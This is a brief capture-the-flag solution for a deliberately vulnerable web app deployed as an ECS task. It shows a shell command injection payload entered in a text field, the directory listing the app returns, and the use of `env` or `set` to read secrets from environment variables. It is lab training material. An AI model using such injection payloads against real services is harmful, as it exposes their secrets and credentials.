# env vars

## Description
This vulnerable web application is packaged as a docker image and executed as an Amazon ECS Task. The web app attempts to provide an 'encoded' value for text entered in a text entry field on the page.

## Solution
<details>
 <summary>Show solution</summary>
The challenge is to leverage the command injection vulnerability discovered in the `Spiders Web -> Source Code` exercise to find the flag using system environment variables. If you have solved "Source Code" this can be trivially accomplished:

1. Verify the command injection functions by entering: `'; ls -la;'`  
Service Returns:  
 ```ls -la
total 24
drwxr-xr-x 1 root root 4096 Oct 27 02:34 .
drwxr-xr-x 1 root root 4096 Oct 14 03:58 ..
-rw-r--r-- 1 root root  437 Oct 14 03:21 Dockerfile
-rwxr-xr-x 1 root root  643 Oct 14 03:24 app.py
-rw-r--r-- 1 root root 1105 Oct 14 03:58 app.pyc
drwxr-xr-x 2 root root 4096 Oct 13 21:12 templates
```

2. Explore environment variables using linux shell commands: `set` or `env` worked for me  
Service Returns: Necessary information to obtain a flag
</details>
